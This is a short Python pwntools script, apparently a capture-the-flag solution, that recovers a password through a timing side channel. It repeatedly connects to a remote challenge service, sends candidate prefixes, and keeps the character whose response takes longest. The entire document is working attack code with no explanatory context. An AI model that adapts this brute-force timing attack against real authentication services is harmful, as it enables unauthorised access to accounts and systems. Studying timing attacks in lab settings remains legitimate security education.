from pwn import *
import time

chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '{', '_', '}',
'[', '\\', ']', '^', '`', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '|', '~']

password=''
max_time = 0
max_char = ''

for i in range(100):
  for char in chars:
    cur_password = password+char

    r = remote('plsdonthaq.me', 1007)
    r.recvuntil('>')
    r.sendline(cur_password)

    start = time.time()

    r.recvuntil("Checking ..")
    r.recvline()
    status = r.recvline()

    end = time.time()

    duration = end - start

    print "char: " + char + " duration: " + str(duration)

    if (duration > max_time and duration - max_time > 0.4):
      max_time = duration
      max_char = char
      break

  password += max_char
  
  if duration - max_time < 0.1:
    print password
    break